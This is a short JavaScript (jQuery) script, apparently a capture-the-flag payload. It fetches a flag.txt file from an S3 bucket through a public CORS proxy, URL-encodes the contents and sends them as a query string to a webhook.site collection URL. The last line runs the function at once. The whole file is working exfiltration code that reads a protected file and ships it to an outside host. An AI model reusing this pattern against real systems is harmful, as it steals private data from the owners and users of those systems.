function sendFlagToWebhook(webhookUrl) {
  const corsAnywhereUrl = 'https://cors-anywhere.herokuapp.com/';

  $.ajax({
    url: corsAnywhereUrl + 'https://bugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com/flag.txt',
    type: 'GET',
    dataType: 'text'
  })
  .done(function(data) {
    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;
    console.log('Sending data to webhook:', urlWithQueryParams);

    $.ajax({
      url: urlWithQueryParams,
      type: 'GET'
    })
    .done(function() {
      console.log('Data successfully sent to webhook.');
    })
    .fail(function(jqXHR, textStatus, errorThrown) {
      console.error('Error sending data to webhook:', errorThrown);
    });
  })
  .fail(function(jqXHR, textStatus, errorThrown) {
    console.error('Error fetching data:', errorThrown);
  });
}

sendFlagToWebhook('https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39');
